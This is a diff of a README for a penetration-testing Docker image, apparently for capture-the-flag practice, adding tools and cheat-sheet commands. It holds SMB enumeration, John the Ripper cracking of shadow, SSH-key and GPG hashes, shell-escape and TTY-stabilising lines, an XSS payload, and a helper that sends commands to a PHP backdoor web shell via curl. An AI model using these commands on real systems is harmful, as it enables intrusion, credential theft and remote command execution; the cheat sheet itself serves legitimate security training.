@@ -35,7 +35,7 @@
 
       export NEW_VERSION=1.0.0
       docker-compose build \
-            && docker tag hacking-tools_hacking-tools:latest manigley/hacking-tools:$NEW_VERSION \
+            && docker tag docker-hacking-tools_hacking-tools:latest manigley/hacking-tools:$NEW_VERSION \
             && docker push manigley/hacking-tools:$NEW_VERSION
 
 ## Credentials
@@ -61,10 +61,43 @@
 | netcat      | /bin/nc.openbsd               |
 | enum4linux  | /usr/share/enum4linux         |
 | PEASS-ng    | /usr/share//PEASS-ng          |
+| metasploit  | /usr/bin/msfconsole           |
+| msfvenom    | /usr/bin/msfvenom             |
 
 ---
 
 ## Helpers
+
+### Links
+
+- https://www.revshells.com/
+- https://gchq.github.io/CyberChef
+- https://gtfobins.github.io/
+- https://pentestmonkey.net/
+- https://github.com/swisskyrepo/PayloadsAllTheThings
+- https://phonebook.cz/
+
+### SMB
+
+      smbclient -L \\\\$TARGET_HOST
+      smbclient \\\\$TARGET_HOST\\ADMIN$ -U Anonymous
+
+      enum4linux -u $TARGET_HOST
+      enum4linux -s $TARGET_HOST
+
+### BruteForce
+
+      /usr/src/john/run/unshadow passwd.txt shadow.txt > unshadowed.txt
+      /usr/src/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+      /usr/src/john/run/john --show unshadowed.txt
+
+      python3 /usr/src/john/run/ssh2john.py id_rsa > id_rsa.hash
+      /usr/src/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+      /usr/src/john/run/john --show id_rsa.hash
+
+      python3 /usr/src/john/run/gpg2john asdfgpg.priv > gpg.hash
+      /usr/src/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
+      /usr/src/john/run/john --show gpg.hash
 
 ### Privilege Escalation
 
@@ -93,6 +126,16 @@
       !sh
 -     zip xy.zip -T -TT 'bash #'
 -     python -c 'import pty;pty.spawn("/bin/bash")'
+-     python -c 'import os; os.system("/bin/sh")'
+
+
+> stable shell (allow CTRL+c, autocomplete etc.)  
+```
+CTRL+z
+stty raw -echo
+fg
+reset
+```
 
 ### RSH
 > more in [RSH.md](RSH.md)
@@ -109,7 +152,7 @@
 
 -     <img src="!" onerror="alert(1);">
 
-### tool finder 
+### Scripts 
 -     type nc; type netcat; type python; type python2; type python3 
 
 
@@ -117,10 +160,3 @@
             declare param=$(omz_urlencode "$1")
             curl "http://10.10.48.94/uploads/php-backdoor.phtml?cmd=$param"
       }
-
-
-
-
-
-    python -c 'import os; os.system("/bin/sh")'
-
